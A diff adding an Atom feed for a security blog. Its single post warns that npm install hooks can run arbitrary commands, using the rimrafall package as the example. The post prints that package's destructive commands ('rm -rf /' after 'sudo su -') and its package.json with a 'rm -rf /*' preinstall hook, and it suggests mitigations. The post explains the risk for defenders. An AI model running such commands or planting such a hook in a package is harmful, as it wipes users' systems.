@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>VulcanoSec Blog</title>
+ <link href="http://vulcanosec.com/blog/atom.xml" rel="self"/>
+ <link href="http://vulcanosec.com/blog/"/>
+ <updated>2015-04-30T17:30:39+02:00</updated>
+ <id>http://vulcanosec.com/blog</id>
+ <author>
+   <name>Dominik Richter</name>
+   <email></email>
+ </author>
+
+ 
+ <entry>
+   <title>`npm install` could be dangerous</title>
+   <link href="http://vulcanosec.com/blog/article/npm-dependency"/>
+   <updated>2015-03-01T22:00:00+01:00</updated>
+   <id>http://vulcanosec.com/blog/article/npm-dependency</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/&quot;&gt;NPM&lt;/a&gt; hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?&lt;/p&gt;
+
+&lt;p&gt;Just recently, &lt;a href=&quot;https://github.com/joaojeronimo&quot;&gt;João Jerónimo&lt;/a&gt; published a special npm modules called &lt;a href=&quot;https://github.com/joaojeronimo/rimrafall&quot;&gt;rimrafall&lt;/a&gt;. He published it at npm and posted it on &lt;a href=&quot;https://news.ycombinator.com/item?id=8947493&quot;&gt;Hacker News&lt;/a&gt;. Essentially this module does the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sudo su -
+rm -rf /
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It uses a special script tag in &lt;code&gt;package.json&lt;/code&gt; to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.&lt;/p&gt;
+
+&lt;p&gt;The package.json looks as follows:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;{
+  &quot;name&quot;: &quot;rimrafall&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;rm -rf /* # DO NOT INSTALL THIS&quot;,
+  &quot;main&quot;: &quot;index.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;preinstall&quot;: &quot;rm -rf /*&quot;
+  },
+  &quot;keywords&quot;: [
+    &quot;rimraf&quot;,
+    &quot;rmrf&quot;
+  ],
+  &quot;author&quot;: &quot;João Jerónimo&quot;,
+  &quot;license&quot;: &quot;ISC&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or CI server.&lt;/p&gt;
+
+&lt;p&gt;Although there is no easy mitigation, you could start building all your node code in a Docker container or use &lt;code&gt;npm install --ignore-scripts&lt;/code&gt;. If you integrate 3rd-party modules, have a look at their source code, especially if it is a new module without much stars.&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+
+</feed>
